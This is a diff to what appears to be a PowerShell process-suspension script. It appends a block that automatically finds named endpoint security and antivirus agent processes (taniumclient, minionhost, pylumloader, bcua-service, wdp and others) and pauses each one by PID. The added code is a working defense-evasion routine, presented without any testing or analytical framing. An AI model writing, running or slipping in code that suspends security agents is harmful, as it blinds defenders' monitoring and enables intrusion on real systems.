@@ -2016,3 +2016,12 @@ function UnPause-Process {
         }
     }
 }
+
+
+$AV = "taniumclient","snac64","pylumloader","minionhost","bcua-service","bcua-notifier","wdp"
+$processes = Get-Process $AV -ea silentlycontinue |Select -expand ID
+
+foreach ($i in $processes){
+Write-output "Pausing PID: " $i
+Pause-Process $i
+}
